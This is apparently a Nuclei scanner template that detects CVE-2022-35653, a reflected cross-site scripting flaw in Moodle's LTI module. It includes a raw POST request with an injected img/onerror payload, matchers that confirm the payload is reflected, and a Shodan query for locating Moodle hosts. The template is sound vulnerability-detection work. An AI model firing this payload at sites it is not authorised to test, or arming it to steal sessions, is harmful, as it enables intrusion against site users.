http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <img/src='x'onerror=alert('document_domain')>
    - moodle-editor
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /mod/lti/auth.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    xxx"><img/src%3d''x''onerror%3dalert(''document_domain'')>=1

    '
id: CVE-2022-35653
info:
  author: iamnoooob,pdresearch
  classification:
    cpe: cpe:2.3:a:moodle:moodle:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-35653
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.79909
    epss-score: 0.00815
  description: 'A reflected XSS issue was identified in the LTI module of Moodle.
    The vulnerability exists due to insufficient sanitization of user-supplied data
    in the LTI module. A remote attacker can trick the victim to follow a specially
    crafted link and execute arbitrary HTML and script code in user''s browser in
    context of vulnerable website to steal potentially sensitive information, change
    appearance of the web page, can perform phishing and drive-by-download attacks.

    '
  metadata:
    max-request: 1
    product: moodle
    shodan-query: title:"Moodle"
    vendor: moodle
    verified: true
  name: Moodle LTI module Reflected - Cross-Site Scripting
  reference:
  - http://git.moodle.org/gw?p=moodle.git&a=search&h=HEAD&st=commit&s=MDL-72299
  - https://nvd.nist.gov/vuln/detail/CVE-2022-35653
  - https://bugzilla.redhat.com/show_bug.cgi?id=2106277
  - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6MOKYVRNFNAODP2XSMGJ5CRDUZCZKAR3/
  - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/MTKUSFPSYFINSQFSOHDQIDVE6FWBEU6V/
  severity: medium
  tags: cve,cve2022,moodle,xss
